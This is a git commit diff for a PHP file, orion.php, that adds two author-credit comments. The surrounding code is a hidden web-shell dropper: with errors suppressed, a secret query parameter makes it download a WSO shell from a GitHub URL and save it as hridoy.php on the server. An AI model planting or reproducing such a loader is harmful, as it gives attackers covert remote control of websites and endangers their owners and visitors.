635976e0d85245eff714de4e07423c3ba9529cff
Orion Hridoy <hridoyorion@gmail.com>
2021-04-19 16:49:32 +0600

    Update orion.php

--- orion.php
+++ orion.php
@@ -1,4 +1,6 @@
 <?php
+//Coded By: Orion Hridoy
+//Facebook: http://fb.com/orion.hridoy
 error_reporting(0);
 if ($_GET["hridoy"]=="orion") {
 	file_put_contents("hridoy.php", file_get_contents("https://raw.githubusercontent.com/orionhridoy/wso-without-backdoor/main/wso.php"));
